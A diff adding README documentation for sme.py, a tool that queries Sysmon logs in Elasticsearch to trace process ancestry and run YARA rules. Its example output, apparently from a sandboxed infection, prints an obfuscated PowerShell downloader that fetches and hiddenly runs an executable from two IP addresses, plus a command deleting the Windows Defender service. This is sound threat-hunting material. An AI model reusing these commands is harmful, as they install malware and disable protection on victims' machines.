@@ -157,3 +157,153 @@ python3 sysmon_more.py -f test_data/sandbox_data -g '{2D395339-4A39-5C4F-0000-00
       - proc_time: 2019-01-28 16:55:41.088
 ```
 
+sme.py - SysMonElasticSearch - utility for querying ancestry information for specific processes (and running yara against them if you wish)
+
+edit /opt/smm/etc/sme.ini with the url to your elasticsearch cluster
+```
+[elk]
+uri = https://user:pass@elasticsearch.domain/
+```
+
+depending on how you are getting sysmon logs into elasticsearch, your field names may be different than the sysmon field names, edit /opt/sme/etc/sme.ini to map sysmon fields to the fields that you have in elasticsearch. the [smm] and [sme] sections of the config need to be modified for the field names in your elasticsearch.
+```
+SysMon_Default_Name = Name_in_Elasticsearch
+...
+SourceProcessGUID = source_process_guid
+TargetProcessId = target_process_id
+TargetProcessGUID = target_process_guid
+```
+
+search elasticsearch (lucene)
+```
+python3 sme.py query 'command_line:*Order*'
+```
+```
+3 process segments found.
+
+     -------------------------
+     process_guid: {2D395339-3BAC-5C52-0000-001006F72300}
+     process_id: 3296
+     image: C:\Program Files\Adobe\Reader 10.0\Reader\AcroRd32.exe
+     command_line: "C:\Program Files\Adobe\Reader 10.0\Reader\AcroRd32.exe" "C:\CIP Change Order  30-01-19 235900.pdf"
+     md5: 6E3D7F11D087FE1AC7865F702665D768
+     sha256: 33F890C10390CE6B587CB3255CEF97AC4D545E4996C359A61FCC4CAA9DA077BB
+     parent_image: C:\Program Files\Microsoft Office\Office14\EXCEL.EXE
+     parent_guid: {2D395339-3645-5C52-0000-0010BEB32100}
+     parent_command_line: "C:\Program Files\Microsoft Office\Office14\EXCEL.EXE" /dde
+     process_id: 3296
+     hostname: vxstream-PC-d2
+     user_name: SYSTEM
+     @timestamp: 2019-01-31T00:05:00.147Z
+     event_id: 1
+
+     -------------------------
+     process_guid: {1018D5A4-1842-5C5B-0000-001011D60A00}
+     process_id: 968
+     image: C:\Program Files (x86)\Microsoft Office\Office14\WINWORD.EXE
+     command_line: "C:\Program Files (x86)\Microsoft Office\Office14\WINWORD.EXE" /n "C:\Users\Sandman\Desktop\Order_Payroll_81154072.doc"
+     md5: BFF948019509B5BF3F9B6CEED2E2B8E3
+     sha256: EE944590B3C253325688F3C1CDDC9A439B5A80A3A36443B4B5DE788DB19D2973
+     parent_image: C:\Windows\explorer.exe
+     parent_guid: {1018D5A4-50DF-5C54-0000-0010019C0100}
+     parent_command_line: C:\Windows\Explorer.EXE
+     process_id: 968
+     hostname: w7GotChaPC
+     user_name: SYSTEM
+     @timestamp: 2019-02-06T17:24:18.272Z
+     event_id: 1
+
+     -------------------------
+     process_guid: {2D395339-E838-5C46-0000-00101DCA1E00}
+     process_id: 3368
+     image: C:\Program Files\Adobe\Reader 10.0\Reader\AcroRd32.exe
+     command_line: "C:\Program Files\Adobe\Reader 10.0\Reader\AcroRd32.exe" "C:\CIP Change Order  22-01-19 100000.pdf"
+     md5: 6E3D7F11D087FE1AC7865F702665D768
+     sha256: 33F890C10390CE6B587CB3255CEF97AC4D545E4996C359A61FCC4CAA9DA077BB
+     parent_image: C:\Program Files\Microsoft Office\Office14\EXCEL.EXE
+     parent_guid: {2D395339-E5BF-5C46-0000-00104F4B1C00}
+     parent_command_line: "C:\Program Files\Microsoft Office\Office14\EXCEL.EXE" /dde
+     process_id: 3368
+     hostname: vxstream-PC-d2
+     user_name: SYSTEM
+     @timestamp: 2019-01-22T09:54:00.253Z
+     event_id: 1
+```
+
+take a look at the ancestry of an interesting guid
+```
+python3 sme.py proc '{1018D5A4-1842-5C5B-0000-001011D60A00}' -w
+```
+```
+---> C:\Windows\explorer.exe - {1018D5A4-50DF-5C54-0000-0010019C0100}
+    ---> C:\Program Files (x86)\Microsoft Office\Office14\WINWORD.EXE - {1018D5A4-1842-5C5B-0000-001011D60A00}
+        ---> C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe - {1018D5A4-1851-5C5B-0000-0010E2C80B00}
+        ---> C:\Users\Sandman\AppData\Local\Temp\fulezad.exe - {1018D5A4-1855-5C5B-0000-00109FED0B00}
+        ---> C:\Users\Sandman\AppData\Local\Temp\fulezad.exe - {1018D5A4-1859-5C5B-0000-00107CFA0B00}
+        ---> C:\Windows\SysWOW64\cmd.exe - {1018D5A4-1859-5C5B-0000-0010ECFB0B00}
+        ---> C:\Windows\SysWOW64\sc.exe - {1018D5A4-1859-5C5B-0000-00105C070C00}
+        ---> C:\Windows\SysWOW64\cmd.exe - {1018D5A4-1859-5C5B-0000-0010B1FC0B00}
+        ---> C:\Windows\SysWOW64\sc.exe - {1018D5A4-1859-5C5B-0000-00105F070C00}
+        ---> C:\Windows\SysWOW64\cmd.exe - {1018D5A4-1859-5C5B-0000-001038FD0B00}
+        ---> C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe - {1018D5A4-1859-5C5B-0000-0010F3060C00}
+        ---> C:\Users\Sandman\AppData\Roaming\cleanmem\fumezad.exe - {1018D5A4-1859-5C5B-0000-001003FF0B00}
+        ---> C:\Users\Sandman\AppData\Roaming\cleanmem\fumezad.exe - {1018D5A4-185E-5C5B-0000-0010D0610C00}
+        ---> C:\Windows\System32\svchost.exe - {1018D5A4-185E-5C5B-0000-0010C9630C00}
+        ---> C:\Windows\splwow64.exe - {1018D5A4-1843-5C5B-0000-00100CF10A00}
+
+#### {1018D5A4-50DF-5C54-0000-0010019C0100} ####
+ - regmod: ['HKU\\S-1-5-21-1660022851-2357930215-3100199371-1001\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\.doc\\OpenWithList\\a']
+ - proc_cmdline: C:\Windows\Explorer.EXE
+ - proc_path: C:\Windows\explorer.exe
+ - proc_id: 1524
+ - proc_guid: {1018D5A4-50DF-5C54-0000-0010019C0100}
+    #### {1018D5A4-1842-5C5B-0000-001011D60A00} ####
+     - regmod: ['HKU\\S-1-5-21-1660022851-2357930215-3100199371-1001\\Software\\Microsoft\\Office\\14.0\\Word\\Security\\Trusted Documents\\TrustRecords\\%USERPROFILE%/Desktop/Order_Payroll_81154072.doc', 'HKU\\S-1-5-21-1660022851-2357930215-3100199371-1001\\Software\\Microsoft\\Office\\14.0\\Word\\Security\\Trusted Documents\\TrustRecords']
+     - proc_time: 2019-02-06T17:24:18.272Z
+     - proc_id: 968
+     - proc_user: SYSTEM
+     - proc_cmdline: "C:\Program Files (x86)\Microsoft Office\Office14\WINWORD.EXE" /n "C:\Users\Sandman\Desktop\Order_Payroll_81154072.doc"
+     - proc_path: C:\Program Files (x86)\Microsoft Office\Office14\WINWORD.EXE
+     - computer_name: w7gotchapc
+     - proc_cd: C:\Users\Sandman\Desktop\
+     - proc_guid: {1018D5A4-1842-5C5B-0000-001011D60A00}
+        #### {1018D5A4-1851-5C5B-0000-0010E2C80B00} ####
+         - proc_time: 2019-02-06T17:24:33.327Z
+         - proc_id: 3628
+         - proc_user: SYSTEM
+         - proc_cmdline: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" "<#11#> function <#new function release#> split-strings([string] $string1){$beos1=1;try{[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }; (new-object system.net.webclient <#replace ext#> ).downloadfile($string1,($env:temp+'\fulezad.exe'));}catch{$beos1=0;}return $beos1;}$mmb1=@('64.44.51.87/electra.crm','89.46.223.114/electra.crm');foreach ($bifa in $mmb1){if(split-strings('https://'+$bifa) -eq 1){break;} };<#validate component#>start-process ($env:temp+'\fulezad.exe') -windowstyle hidden;"
+         - proc_path: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+         - computer_name: w7gotchapc
+         - proc_cd: C:\Users\Sandman\Desktop\
+         - proc_guid: {1018D5A4-1851-5C5B-0000-0010E2C80B00}
+        #### {1018D5A4-1855-5C5B-0000-00109FED0B00} ####
+         - proc_time: 2019-02-06T17:24:37.133Z
+         - proc_id: 3588
+         - proc_user: SYSTEM
+         - proc_cmdline: "C:\Users\Sandman\AppData\Local\Temp\fulezad.exe"
+         - proc_path: C:\Users\Sandman\AppData\Local\Temp\fulezad.exe
+         - computer_name: w7gotchapc
+         - proc_cd: C:\Users\Sandman\Desktop\
+         - proc_guid: {1018D5A4-1855-5C5B-0000-00109FED0B00}
+        ...
+        #### {1018D5A4-1859-5C5B-0000-0010B1FC0B00} ####
+         - proc_time: 2019-02-06T17:24:41.666Z
+         - proc_id: 3704
+         - proc_user: SYSTEM
+         - proc_cmdline: /c sc delete WinDefend
+         - proc_path: C:\Windows\SysWOW64\cmd.exe
+         - computer_name: w7gotchapc
+         - proc_cd: C:\Windows\system32\
+         - proc_guid: {1018D5A4-1859-5C5B-0000-0010B1FC0B00}
+        ... 
+        ... hopefully you get the idea
+```
+run yara on that process
+
+```
+python3 sme.py proc '{1018D5A4-1842-5C5B-0000-001011D60A00}' -w -y
+```
+```
+['powershell_obfuscation', 'powershell_startprocess']
+['$path=_path=C:\\Windows\\SysWOW64\\cmd.exe', '$a_leftbrace=_cmdline="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" "<#11#> function <#new function release#> split-strings([string] $string1){$beos1=1;try{[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }; (new-object system.net.webclient <#replace ext#> ).downloadfile($string1,($env:temp+\'\\fulezad.exe\'));}catch{$beos1=0;}return $beos1;}$mmb1=@(\'64.44.51.87/electra.crm\',\'89.46.223.114/electra.crm\');foreach ($bifa in $mmb1){if(split-strings(\'https://\'+$bifa) -eq 1){', '$cmdline1=cmdline="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" "<#11#> function <#new function release#> split-strings([string] $string1){$beos1=1;try{[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }; (new-object system.net.webclient <#replace ext#> ).downloadfile($string1,($env:temp+\'\\fulezad.exe\'));}catch{$beos1=0;}return $beos1;}$mmb1=@(\'64.44.51.87/electra.crm\',\'89.46.223.114/electra.crm\');foreach ($bifa in $mmb1){if(split-strings(\'https://\'+$bifa) -eq 1){break;} };']
+```
